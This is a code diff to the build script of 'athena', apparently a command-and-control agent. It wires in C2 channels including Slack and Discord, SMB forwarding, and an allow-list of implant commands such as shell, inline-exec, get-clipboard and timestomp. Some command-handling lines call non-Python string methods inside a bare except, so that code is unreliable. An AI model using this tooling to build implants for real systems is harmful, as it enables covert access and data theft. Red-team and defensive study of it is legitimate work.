@@ -251,27 +251,33 @@ class athena(PayloadType):
 
             directives = self.get_parameter("configuration").upper()
             rid = ""
+            roots_replace = ""
 
             for c2 in self.c2info:
                 profile = c2.get_c2profile()
                 build_msg += "Adding {} profile...".format(profile["name"]) + '\n'
                 if profile["name"] == "http":
+                    roots_replace += "<assembly fullname=\"Athena.Profiles.HTTP\"/>" + '\n'
                     buildHTTP(self, agent_build_path, c2)
                     addProfile(agent_build_path, "HTTP")
                     directives += ";HTTP"
                 elif profile["name"] == "smb":
+                    roots_replace += "<assembly fullname=\"Athena.Profiles.SMB\"/>" + '\n'
                     buildSMB(self, agent_build_path, c2)
                     addProfile(agent_build_path, "SMB")
                     directives += ";SMB"
                 elif profile["name"] == "websocket":
+                    roots_replace += "<assembly fullname=\"Athena.Profiles.Websocket\"/>" + '\n'
                     buildWebsocket(self, agent_build_path, c2)
                     addProfile(agent_build_path, "Websocket")
                     directives += ";WEBSOCKET"
                 elif profile["name"] == "slack":
+                    roots_replace += "<assembly fullname=\"Athena.Profiles.Slack\"/>" + '\n'
                     buildSlack(self, agent_build_path, c2)
                     addProfile(agent_build_path, "Slack")
                     directives += ";SLACK"
                 elif profile["name"] == "discord":
+                    roots_replace += "<assembly fullname=\"Athena.Profiles.Discord\"/>" + '\n'
                     buildDiscord(self, agent_build_path, c2)
                     addProfile(agent_build_path, "Discord")
                     directives += ";DISCORD"
@@ -281,26 +287,30 @@ class athena(PayloadType):
             build_msg += "Adding forwarder type...{}".format(self.get_parameter("forwarder-type")) + '\n'
             if self.get_parameter("forwarder-type") == "smb":  # SMB Forwarding selected by the user
                 directives += ";SMBFWD"
+                roots_replace += "<assembly fullname=\"Athena.Forwarders.SMB\"/>" + '\n'
                 addForwarder(agent_build_path, "SMB")
             else:  # None selected
                 directives += ";EMPTYFWD"
+                roots_replace += "<assembly fullname=\"Athena.Forwarders.Empty\"/>" + '\n'
                 addForwarder(agent_build_path, "Empty")
 
             stdout_err = ""
-            for cmd in self.commands.get_commands():
-                if cmd == "execute-assembly":
-                    build_msg += "Ignoring Execute-Assembly" + '\n'
-                    continue
-                elif cmd == "ds" and self.selected_os.upper() == "REDHAT":
-                    build_msg += "Ignoring ds because it's not supported on RHEL" + '\n'
-                    continue
+            loadable_commands = ["arp","cat","cd","cp","crop","drives","ds","env","farmer","get-clipboard","get-localgroup","get-sessions","get-shares","hostname","ifconfig","inline-exec",
+            "kill","ls","mkdir","mv","nslookup","patch","ps","pwd","reg","rm","sftp","shell","ssh","tail","test-port","timestomp","uptime","wget","whoami","win-enum-resources"]
 
-                try:
-                    build_msg += "Adding command...{}".format(cmd) + '\n'
-                    directives += cmd.Replace("-","").Upper() + ";"
-                    addCommand(agent_build_path, cmd) + '\n'
-                except:
-                    pass
+            for cmd in self.commands.get_commands():
+                if cmd in loadable_commands:
+                    if cmd == "ds" and self.selected_os.upper() == "REDHAT":
+                        build_msg += "Ignoring ds because it's not supported on RHEL" + '\n'
+                        continue
+                    else:
+                        try:
+                            build_msg += "Adding command...{}".format(cmd) + '\n'
+                            directives += cmd.Replace("-","").Upper() + ";"
+                            addCommand(agent_build_path, cmd) + '\n'
+                            roots_replace += "<assembly fullname=\"{}\"/>".format(cmd) + '\n'
+                        except:
+                            pass
 
             build_msg += "Determining selected OS...{}".format(self.selected_os) + '\n'
             if self.selected_os.upper() == "WINDOWS":
@@ -338,29 +348,11 @@ class athena(PayloadType):
             os.environ["AthenaConstants"] = directives
 
 
-            # #define the constants for the plugins
-            # baseCSProj = open(handlerPath, "r").read()
-            # baseCSProj = baseCSProj.replace("REPLACEME", directives)
-            # with open(handlerPath, "w") as f:
-            #     f.write(baseCSProj)
-
-            # #define the constants for the agent
-            # baseCSProj = open("{}/Athena/Athena.csproj".format(agent_build_path.name), "r").read()
-            # baseCSProj = baseCSProj.replace("TRACE", directives)
-            # with open("{}/Athena/Athena.csproj".format(agent_build_path.name), "w") as f:
-            #     f.write(baseCSProj)
-
-            # #define the constants for the agent utilities
-            # baseCSProj = open("{}/Athena.Utilities/Athena.Utilities.csproj".format(agent_build_path.name), "r").read()
-            # baseCSProj = baseCSProj.replace("REPLACEME", directives)
-            # with open("{}/Athena.Utilities/Athena.Utilities.csproj".format(agent_build_path.name), "w") as f:
-            #     f.write(baseCSProj)
-
-            # #define the constants for the agent common handler
-            # baseCSProj = open("{}/Athena.Commands.Common/Athena.Handler.Common.csproj".format(agent_build_path.name), "r").read()
-            # baseCSProj = baseCSProj.replace("REPLACEME", directives)
-            # with open("{}/Athena.Commands.Common/Athena.Handler.Common.csproj".format(agent_build_path.name), "w") as f:
-            #     f.write(baseCSProj)
+            # Replace the roots file with the new one
+            baseRoots = open("{}/Athena/Roots.xml".format(agent_build_path.name), "r").read()
+            baseRoots = baseRoots.replace("<!-- {{REPLACEME}} -->", roots_replace)
+            with open("{}/Athena/Roots.xml".format(agent_build_path.name), "w") as f:
+                f.write(baseRoots)
 
             if self.get_parameter("output-type") == "source":
                 resp.status = BuildStatus.Success
